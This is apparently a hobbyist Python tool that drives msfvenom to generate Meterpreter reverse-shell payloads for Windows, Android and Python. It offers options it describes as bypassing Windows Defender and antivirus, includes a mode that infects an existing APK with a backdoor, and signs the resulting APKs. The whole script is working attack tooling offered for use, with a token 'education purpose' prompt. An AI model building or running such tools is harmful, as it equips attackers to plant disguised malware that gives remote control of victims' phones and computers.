import os
import sys
import time
os.system("clear")
euid = os.geteuid()
if euid != 0:
    print ("\u001b[32m.this Script must started as root. Running sudo")
    args = ['sudo', sys.executable] + sys.argv + [os.environ]
    os.execlpe('sudo', *args)
else:
    print("\u001b[32m.[+]running as root\u001b[37m.")
os.system("figlet by youssef")
print("facebook=youssefslimene")
print("github=https://github.com/youhacker55/")
education = input("this script for education purpose yes/no:")
if education == "yes":
    print("good lets go")
elif education == "no":
    exit()
else:
    print("type yes or no")
    exit()
if os.path.isfile('/usr/bin/msfvenom') == True:
    print("\u001b[32m.[+]msfvenom is installed\u001b[37m.")
    time.sleep(1.5)

if os.path.isfile('/usr/bin/msfvenom') == False:
    print("msfvenom not found")
    print("installing msfvenom")
    os.system("apt-get install metasploit-framework")

far = ".apk"
print("1) windows payload(bypass windeffender)")
print("2) generate apk bypass av")
print("3) infect original apk")
print("4) python payload")
num = int(input("choose a number:"))
if num == 1:
  os.system("python3 code.py")
if num == 2:

  type = input("payload type (http,https,tcp):")
  host = input("type your lhost:")
  port = input("type your lport:")
  name = input("entre payload name:")
  os.system( "msfvenom -p android/meterpreter/reverse_" + type + " lhost=" + host + " lport=" + port +"  -o crypters/output/android/"+name+far)
  print("\n\033[1m\033[36m#|signing APK|#\n\033[1m\033[36m")
  os.system("keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000")
  os.system('jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore ' + name + far + ' alias_name')
  os.system("cd crypters/output/android/ && rm -rf my-release-key.keystore")
if num == 3:

    org = input("entre the apk to infect:")
    lhost = input("entre your lhost:")
    lport = input("entre your lport:")
    typer = input("protocol type(https,tcp):")
    ps = input("entre payload name:")
    os.system('sudo msfvenom -p ' "android/meterpreter/reverse_"+typer+  ' -x ' + org + ' LHOST=' + lhost + ' LPORT=' + lport + ' -o  crypters/output/android/'+ps+far )
    os.system("cd crypters/output/android/ &&  keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000")
    os.system('jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore ' + ps + far + ' alias_name')
    os.system("cd crypters/output/android/ && rm -rf my-release-key.keystore")
    time.sleep(3)


if num == 4:
  meg = input("payload type(http tcp https):")
  lmost = input("entre your lhost:")
  lmort = input("entre your lport:")
  mame = input("payload name:")
  os.system("msfvenom -p python/meterpreter/reverse_"+meg+  " lhost="+ lmost + " lport="+ lmort + " -o crypters/output/python-payloads/"+mame+".py")
  crypt = input("do you want to encrypt the payload:")
  if crypt == "yes":
    time.sleep(2)
    os.system("cd crypters/output/python-payloads && python3 python-encrypt.py ")
  elif crypt == "no":
      print("have fun hacking")
  else:
      print("wrong commend")
